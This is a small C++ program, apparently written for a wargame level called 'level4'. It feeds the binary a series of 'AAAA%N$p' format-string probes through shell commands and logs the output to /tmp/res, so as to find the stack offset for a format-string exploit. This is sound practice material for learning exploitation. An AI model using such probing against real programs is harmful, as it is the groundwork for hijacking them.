#include <string>
#include <iostream>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <sstream>

int main ()
{
    std::string str;
    std::string offstr;
    std::string tail = "$p\0";
    std::string cmd;
    int offset = 1;
    int i = 0;
    int j = 0;

    while (offset < 50)
    {
        cmd = "echo \'";
        str = "AAAA%";
        // offstr = std::to_string(offset);

        std::ostringstream convert;
        convert << offset;
        offstr = convert.str();

        str.append(offstr);
        str.append(tail);
        offset++;

        cmd.append(str);
        cmd.append("\' > /tmp/str");

        system(cmd.c_str());
        // std::cout << cmd << std::endl;
        system("(~/level4 < /tmp/str) >> /tmp/res");

        // std::cout << str << std::endl;
    }
    return (0);
}